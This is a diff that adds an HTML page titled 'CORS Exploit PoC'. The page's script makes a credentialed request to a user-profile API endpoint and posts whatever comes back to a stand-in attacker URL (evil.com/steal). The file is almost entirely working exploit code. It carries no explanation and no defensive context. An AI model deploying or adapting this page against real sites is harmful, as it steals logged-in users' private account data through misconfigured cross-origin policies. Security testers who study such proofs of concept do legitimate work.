@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Exploit PoC</title>
+</head>
+<body>
+  <h1>CORS Exploit Running...</h1>
+  <script>
+    fetch("https://beta.api.domain.com/user/me", {
+      method: "GET",
+      credentials: "include"
+    })
+    .then(response => response.text())
+    .then(data => {
+      console.log("Leaked data:", data);
+      // Send data to attacker's server
+      fetch("https://evil.com/steal", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ stolen: data })
+      });
+    })
+    .catch(err => console.error("CORS failed or user not logged in", err));
+  </script>
+</body>
+</html>
